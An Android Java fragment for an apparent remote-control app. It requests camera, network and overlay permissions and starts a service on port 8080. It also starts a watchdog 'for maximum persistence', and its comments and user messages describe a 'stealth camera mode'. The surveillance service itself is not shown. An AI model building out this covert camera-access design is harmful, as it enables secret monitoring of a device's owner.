package com.example.myapplication555;

import android.Manifest;
import android.app.ActivityManager;
import android.content.Intent;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.fragment.app.Fragment;
import androidx.navigation.fragment.NavHostFragment;

import com.example.myapplication555.databinding.FragmentFirstBinding;
import com.example.myapplication555.service.RemoteControlService;
import com.example.myapplication555.managers.WatchdogManager;
import com.google.android.material.snackbar.Snackbar;

import java.util.List;

import pub.devrel.easypermissions.EasyPermissions;

public class FirstFragment extends Fragment implements EasyPermissions.PermissionCallbacks {

    private static final String TAG = "FirstFragment";
    private static final int REQUEST_CODE_PERMISSIONS = 123;
    
    // Required permissions for remote control functionality
    private static final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.CAMERA,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.ACCESS_WIFI_STATE
    };

    private FragmentFirstBinding binding;
    private boolean isServiceRunning = false;
    private WatchdogManager watchdogManager;

    @Override
    public View onCreateView(
            @NonNull LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState
    ) {
        binding = FragmentFirstBinding.inflate(inflater, container, false);
        return binding.getRoot();
    }

    public void onViewCreated(@NonNull View view, Bundle savedInstanceState) {
        super.onViewCreated(view, savedInstanceState);

        // Initialize watchdog manager
        watchdogManager = new WatchdogManager(getContext());

        // Set up click listeners
        binding.controlButton.setOnClickListener(this::toggleRemoteControlService);
        binding.aboutLink.setOnClickListener(v ->
                NavHostFragment.findNavController(FirstFragment.this)
                        .navigate(R.id.action_FirstFragment_to_SecondFragment)
        );

        // Check permissions and service status
        checkPermissions();
        checkServiceStatus();
    }

    /**
     * Toggle remote control service on/off
     */
    private void toggleRemoteControlService(View view) {
        if (hasAllPermissions()) {
            if (!isServiceRunning) {
                startRemoteControlService();
            } else {
                stopRemoteControlService();
            }
        } else {
            requestPermissions();
        }
    }

    /**
     * Start the remote control service
     */
    private void startRemoteControlService() {
        Intent serviceIntent = new Intent(getContext(), RemoteControlService.class);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getContext().startForegroundService(serviceIntent);
        } else {
            getContext().startService(serviceIntent);
        }
        
        isServiceRunning = true;
        updateUI();
        
        // Start watchdog for maximum persistence
        watchdogManager.startWatchdog();
        
        // Show success message
        String ipAddress = getDeviceIPAddress();
        String message = "✅ Remote Control Started!\n\nDevice IP: " + ipAddress + ":8080";
        
        Snackbar.make(binding.getRoot(), "Remote Control Started - IP: " + ipAddress + ":8080", 
                     Snackbar.LENGTH_LONG).show();
        
        Log.i(TAG, "Remote control service started on IP: " + ipAddress + ":8080");
    }

    /**
     * Stop the remote control service
     */
    private void stopRemoteControlService() {
        Intent serviceIntent = new Intent(getContext(), RemoteControlService.class);
        getContext().stopService(serviceIntent);
        
        // Stop watchdog monitoring
        watchdogManager.stopWatchdog();
        
        isServiceRunning = false;
        updateUI();
        
        Snackbar.make(binding.getRoot(), "Remote Control Stopped", Snackbar.LENGTH_SHORT).show();
        Log.i(TAG, "Remote control service stopped");
    }

    /**
     * Update UI based on service status
     */
    private void updateUI() {
        if (isServiceRunning) {
            // Active state
            binding.statusIndicator.setBackgroundResource(R.drawable.circle_active);
            binding.statusText.setText(R.string.status_active);
            binding.statusText.setTextColor(getResources().getColor(R.color.success_green, null));
            
            String ipAddress = getDeviceIPAddress();
            binding.ipAddressText.setText(ipAddress + ":8080" + getString(R.string.device_ip_address));
            binding.helperText.setVisibility(View.VISIBLE);
            
            binding.controlButton.setText(R.string.stop_remote_control);
            binding.controlButton.setBackgroundTintList(
                    getContext().getColorStateList(R.color.button_inactive));
        } else {
            // Inactive state
            binding.statusIndicator.setBackgroundResource(R.drawable.circle_inactive);
            binding.statusText.setText(R.string.status_inactive);
            binding.statusText.setTextColor(getResources().getColor(R.color.inactive_red, null));
            
            binding.ipAddressText.setText(R.string.obtaining_ip);
            binding.helperText.setVisibility(View.GONE);
            
            binding.controlButton.setText(R.string.start_remote_control);
            binding.controlButton.setBackgroundTintList(
                    getContext().getColorStateList(R.color.button_active));
        }
    }

    /**
     * Check if all required permissions are granted
     */
    private boolean hasAllPermissions() {
        // Check regular permissions
        boolean hasRegularPermissions = EasyPermissions.hasPermissions(getContext(), REQUIRED_PERMISSIONS);
        
        // Check overlay permission separately (Android 6.0+)
        boolean hasOverlayPermission = true;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            hasOverlayPermission = Settings.canDrawOverlays(getContext());
        }
        
        return hasRegularPermissions && hasOverlayPermission;
    }

    /**
     * Check and request permissions if needed
     */
    private void checkPermissions() {
        if (!hasAllPermissions()) {
            requestPermissions();
        }
    }

    /**
     * Request all required permissions
     */
    private void requestPermissions() {
        // Request regular permissions first
        EasyPermissions.requestPermissions(
                this,
                "This app needs camera and network permissions for remote control functionality.",
                REQUEST_CODE_PERMISSIONS,
                REQUIRED_PERMISSIONS
        );
        
        // Request overlay permission separately (Android 6.0+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(getContext())) {
            requestOverlayPermission();
        }
    }

    /**
     * Request overlay permission for stealth camera functionality
     */
    private void requestOverlayPermission() {
        Log.d(TAG, "Requesting overlay permission for stealth camera");
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
            intent.setData(Uri.parse("package:" + getContext().getPackageName()));
            
            Toast.makeText(getContext(), "🎭 Please allow 'Display over other apps' for stealth camera mode", Toast.LENGTH_LONG).show();
            
            try {
                startActivity(intent);
            } catch (Exception e) {
                Log.e(TAG, "Error opening overlay permission settings", e);
                Toast.makeText(getContext(), "Please manually enable 'Display over other apps' in Settings", Toast.LENGTH_LONG).show();
            }
        }
    }

    /**
     * Get device IP address for WiFi connection
     */
    private String getDeviceIPAddress() {
        WifiManager wifiManager = (WifiManager) getContext().getSystemService(getContext().WIFI_SERVICE);
        if (wifiManager != null) {
            int ipAddress = wifiManager.getConnectionInfo().getIpAddress();
            return String.format("%d.%d.%d.%d",
                    (ipAddress & 0xff),
                    (ipAddress >> 8 & 0xff),
                    (ipAddress >> 16 & 0xff),
                    (ipAddress >> 24 & 0xff));
        }
        return "Unable to get IP";
    }

    /**
     * Check if RemoteControlService is already running (auto-started)
     */
    private void checkServiceStatus() {
        if (isServiceRunning(RemoteControlService.class)) {
            isServiceRunning = true;
            updateUI();
            
            // Show that service is already running
            String ipAddress = getDeviceIPAddress();
            Snackbar.make(binding.getRoot(), "Remote Control Running - IP: " + ipAddress + ":8080", 
                         Snackbar.LENGTH_LONG).show();
            Log.i(TAG, "Remote control service detected running on IP: " + ipAddress + ":8080");
        } else {
            isServiceRunning = false;
            updateUI();
        }
    }

    /**
     * Check if a specific service is running
     */
    private boolean isServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getContext().getSystemService(getContext().ACTIVITY_SERVICE);
        if (manager != null) {
            for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
                if (serviceClass.getName().equals(service.service.getClassName())) {
                    return true;
                }
            }
        }
        return false;
    }

    // Permission callbacks
    @Override
    public void onPermissionsGranted(int requestCode, List<String> perms) {
        Log.d(TAG, "Permissions granted: " + perms);
        Toast.makeText(getContext(), "Permissions granted! You can now start remote control.", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onPermissionsDenied(int requestCode, List<String> perms) {
        Log.e(TAG, "Permissions denied: " + perms);
        Toast.makeText(getContext(), "Required permissions denied. App won't work properly.", Toast.LENGTH_LONG).show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, this);
    }

    @Override
    public void onDestroyView() {
        super.onDestroyView();
        binding = null;
    }
}